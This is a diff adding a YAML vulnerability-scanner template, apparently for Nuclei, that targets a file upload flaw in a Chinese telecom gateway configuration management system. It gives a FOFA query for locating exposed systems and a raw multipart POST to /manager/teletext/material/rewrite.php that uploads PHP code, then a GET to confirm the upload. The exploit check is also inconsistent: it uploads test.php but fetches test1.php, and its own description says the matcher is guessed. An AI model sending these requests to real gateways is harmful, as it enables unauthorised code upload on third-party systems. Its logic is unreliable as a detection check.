@@ -1,0 +1,60 @@
+id: poc-71918f7f2531d1f76dd4
+info:
+  name: 电信网关配置管理系统rewrite存在文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/71918f7f2531d1f76dd4a648624543cc
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 71918f7f2531d1f76dd4a648624543cc
+    fofa: + fofa`body="img/dl.gif" && title="系统登录"`
+http:
+- raw:
+  - 'POST /manager/teletext/material/rewrite.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOKldnDPT
+
+    Connection: close
+
+
+    ------WebKitFormBoundaryOKldnDPT
+
+    Content-Disposition: form-data; name="tmp_name"; filename="test.php"
+
+    Content-Type: image/png
+
+
+    <?php echo md5(''666'');unlink(__FILE__);?>
+
+    ------WebKitFormBoundaryOKldnDPT
+
+    Content-Disposition: form-data; name="uploadtime"
+
+
+
+    ------WebKitFormBoundaryOKldnDPT--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /xmedia/material/test1.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
